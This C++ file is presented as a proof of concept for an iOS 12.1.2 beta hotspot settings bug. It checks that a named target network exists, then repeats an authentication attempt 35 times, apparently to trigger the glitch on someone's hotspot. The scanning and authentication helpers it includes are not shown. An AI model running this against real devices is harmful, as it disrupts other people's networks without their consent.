#include <iostream>
#include "util/auth.cpp"
#include "util/scan.cpp"


/*
iOS 12.1.2 b3 Hotspot Settings Bug/Glitch POC
Date: 11/01/21
Author: 0x1CA3
*/


int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <network_ssid> <network_adapter>", argv[0]);
        exit(EXIT_FAILURE);
    }
    if (NetworkScanning().network_scanning(argv[1]) == false) {
        fprintf(stderr, "Error: Target network '%s' not found!\n", argv[1]);
        exit(EXIT_FAILURE);
    }
    for (int i = 0; i < 35; i++) {
        if (Authentication().network_authentication(argv[1], argv[2]) == false) {
            fprintf(stderr, "Error: An unexpected error has occured, please verify that your SSID or network adapter is valid!\n");
            exit(EXIT_FAILURE);
        }
    }
    EXIT_SUCCESS;
}